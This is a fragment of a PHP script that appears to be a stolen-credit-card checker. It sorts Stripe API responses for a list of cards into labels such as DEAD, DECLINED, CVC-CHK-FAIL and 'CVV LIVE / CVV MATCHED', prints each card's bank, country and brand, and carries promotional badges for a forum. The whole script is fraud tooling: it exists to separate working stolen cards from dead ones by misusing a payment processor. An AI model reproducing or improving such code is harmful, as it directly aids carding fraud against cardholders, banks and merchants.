}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC-DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CARD-NOT-SUPPORTED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-UNCHK</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT-SUPPORTED-CURRENCY</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT SUPPORTED PURCHASE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">'.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SK TESTMODE_CHARGE ONLY</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">  '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SK KEY REVOKED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">   '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">     '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">Card Not Supported</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
else {
    echo '   <font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">   '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">Gate Closed</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
   

      
   
      
}

$end = microtime(true);
$time_taken = $end - $start;

echo "ᵗⁱᵐᵉ: " . round($time_taken, .5) . " s.";

echo " ᵇʸᵖᵃˢˢⁱⁿᵍ: $x <br>";
  curl_close($curl);
  ob_flush();
  

?>
